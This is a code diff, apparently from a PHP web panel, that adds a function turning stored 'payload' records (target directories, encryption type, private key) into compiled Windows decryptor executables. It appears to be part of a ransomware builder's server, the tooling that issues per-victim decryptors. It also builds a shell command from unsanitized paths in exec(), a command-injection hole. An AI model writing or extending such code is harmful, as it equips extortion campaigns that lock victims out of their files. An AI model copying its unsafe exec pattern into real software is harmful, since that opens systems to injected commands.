@@ -155,4 +155,40 @@ protected function getClientCodeTemplate($targetDirs, $algorithm) {
 
         return $code;
     }
+
+    public function generateDecryptor($payloadId) {
+    $payload = \App\Models\Payload::findOrFail($payloadId);
+    
+    $targetDirs = $payload->target_directories;
+    $algorithm = $payload->encryption_type;
+
+    if (is_array($targetDirs)) {
+        $formattedDirs = implode(',', $targetDirs);
+    } else {
+        $formattedDirs = $targetDirs;
+    }
+
+    $stubPath = resource_path("stubs/{$algorithm}_decryptor.go");
+    if (!file_exists($stubPath)) {
+        $stubPath = resource_path("stubs/aes_decryptor.go");
+    }
+    
+    $code = file_get_contents($stubPath);
+
+    $code = str_replace('__TARGET_DIRECTORIES__', $formattedDirs, $code);
+    
+    if ($algorithm === 'rsa' || $algorithm === 'hybrid') {
+        $code = str_replace('__PRIVATE_KEY__', $payload->private_key, $code);
+    }
+
+    $tempDir = storage_path('app/temp/' . uniqid());
+    mkdir($tempDir, 0755, true);
+    file_put_contents($tempDir . '/decryptor.go', $code);
+
+    $outputPath = public_path('payloads/decryptor_' . $payload->id . '.exe');
+    
+    exec("cd {$tempDir} && GOOS=windows GOARCH=amd64 go build -o {$outputPath} decryptor.go");
+
+    return $outputPath;
+}
 }
